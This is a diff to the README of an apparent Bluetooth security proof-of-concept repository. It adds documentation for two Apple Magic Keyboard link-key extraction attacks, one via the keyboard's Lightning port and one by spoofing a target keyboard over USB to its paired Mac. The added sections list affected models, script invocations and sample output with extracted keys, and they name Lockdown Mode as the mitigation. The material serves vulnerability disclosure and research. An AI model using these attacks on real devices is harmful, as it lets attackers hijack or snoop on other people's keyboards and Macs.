@@ -11,9 +11,9 @@ This repository contains proof-of-concept scripts for CVE-2023-45866, ~CVE-2024-
 | [macOS Keystroke Injection](#macos-keystroke-injection) | Force-pairs a virtual Bluetooth keyboard with a macOS host and injects keystrokes to open a web browser and perform a Google search. |
 | TODO iPhone Keystroke Injection | |
 | TODO Windows Keystroke Injection | |
-| TODO Magic Keyboard Link Key via Lightning Port | |
+| [Magic Keyboard Link Key via Lightning Port](#magic-keyboard-link-key-via-lightning-port) | Reads the Bluetooth link key from the Lightning port on a Magic Keyboard. |
 | TODO Magic Keyboard Link Key via Bluetooth | |
-| TODO Magic Keyboard Link Key via USB Port on the Mac | |
+| [Magic Keyboard Link Key via USB Port on the Mac](#magic-keyboard-link-key-via-usb-port-on-mac) | Reads the Bluetooth link key for a target Magic Keyboard by spoofing the keyboard over USB to its paired Mac. |
 
 ## Dependencies
 
@@ -504,4 +504,112 @@ options:
 [2024-01-07 12:25:49.655]  [TX-19] a101000000000000000000
 [2024-01-07 12:25:49.760]  payload has been transmitted; disconnecting Bluetooth HID client
 [2024-01-07 12:25:49.761]  taking 'hci1' offline
+```
+
+## Link Key Extraction
+
+### Magic Keyboard Link Key via Lightning Port
+
+When the Magic Keyboard is plugged into the Mac, the Mac sends the Bluetooth link key to the Magic Keyboard over USB.
+
+The link key remains in memory until the Magic Keyboard is powered off, and can be read by an attacker with access to the lightning port on the keyboard.
+
+This attack can be mitigated by enabling Lockdown Mode on the Mac.
+
+#### Affected Versions
+
+The following Apple peripherals were tested and found vulnerable to this attack. No other peripherals were tested, so this list may be incomplete.
+
+| Product Name | Model Number |
+|-|-|
+| Magic Keyboard | A2450 |
+| Magic Keyboard with Touch ID | A2449 |
+| Magic Keyboard with Numeric Keypad | A1843 |
+| Magic Keyboard with Touch ID and Numeric Keypad | A2520 |
+| Magic Mouse | A1657 |
+
+#### Starting State
+
+- Magic Keyboard has remained powered on since it was last plugged into the Mac
+
+#### Running the PoC
+
+Plug the Magic Keyboard into the Linux computer with a Lightning-to-USB cable and run the script with no parameters.
+
+```
+./read-link-key-lightning.py
+```
+
+#### Output
+
+```
+Model          - Magic Keyboard
+Serial Number  - F1T2107RUNW12NXA9
+BT Address     - 1c:57:fc:08:65:12
+Mac BT Address - a4:c3:99:e8:a8:6c
+BT Link Key    - c95e3ec98809f2745d32029e7f97b67e
+```
+
+### Magic Keyboard Link Key via USB Port on Mac
+
+When the Magic Keyboard is plugged into the Mac, the Mac sends the Bluetooth link key to the Magic Keyboard over USB.
+
+The next time the Magic Keyboard is plugged into the Mac, it is recognized by its Bluetooth address and serial number, and the Mac sends the original link key to the Magic Keyboard.
+
+If an attacker knows the Bluetooth address and serial number of a target Magic Keyboard, they can spoof the Magic Keyboard to the Mac over USB, and read the target link key from the USB port on the Mac.
+
+The PoC implements this attack by writing the target Bluetooth address and serial number to a donor keyboard, plugging the donor keyboard into the Mac, and then reading the link key off of the donor keyboard.
+
+This attack is mitigated my enabling Lockdown Mode on the Mac.
+
+#### Affected Versions
+
+macOS versions 12, 13 and 14 were tested and found to be vulnerable to this attack. Earlier versions of macOS were not tested.
+
+The following Apple peripherals were tested and found vulnerable to this attack. No other peripherals were tested, so this list may be incomplete.
+
+| Product Name | Model Number |
+|-|-|
+| Magic Keyboard | A2450 |
+| Magic Keyboard with Touch ID | A2449 |
+| Magic Keyboard with Numeric Keypad | A1843 |
+| Magic Keyboard with Touch ID and Numeric Keypad | A2520 |
+| Magic Mouse | A1657 |
+
+#### Starting State
+
+- Magic Keyboard is paired with a Mac that does not in Lockdown Mode enabled
+- The attacker knows the Bluetooth address and serial number of the Magic Keyboard
+- The attacker as a donor Magic Keyboard (which will be temporarily reconfigured to spoof the target keyboard)
+
+#### Running the PoC
+
+```
+> ./read-link-key-from-mac.py --help
+usage: read-link-key-from-mac.py [-h] -a KEYBOARD_ADDRESS -s KEYBOARD_SERIAL
+
+options:
+  -h, --help            show this help message and exit
+  -a KEYBOARD_ADDRESS, --keyboard_address KEYBOARD_ADDRESS
+  -s KEYBOARD_SERIAL, --keyboard_serial KEYBOARD_SERIAL
+```
+
+#### Invocation
+
+```
+./read-link-key-from-mac.py -a 1c:57:fc:08:65:12 -s F1T2107RUNW12NXA9
+```
+
+#### Output
+
+```
+[2024-01-08 10:34:53.910]  Turn on the donor keyboard and plug it into this computer
+[2024-01-08 10:34:58.200]  changing Bluetooth address from 3C:A6:F6:E1:3D:F0 to 1c:57:fc:08:65:12
+[2024-01-08 10:34:58.201]  serial number: F0T230C02AZ0NC1EH -> F1T2107RUNW12NXA9
+[2024-01-08 10:34:58.202]  Unplug the donor keyboard and plug it into the Mac.
+[2024-01-08 10:34:58.202]  Wait a few seconds, then plug it back into this computer.
+[2024-01-08 10:35:02.533]  keyboard was unplugged
+[2024-01-08 10:35:13.463]  keyboard has returned
+[2024-01-08 10:35:13.464]  Mac BT Address - a4:c3:99:e8:a8:6c
+[2024-01-08 10:35:13.464]  BT Link-Key    - c95e3ec98809f2745d32029e7f97b67e
 ```
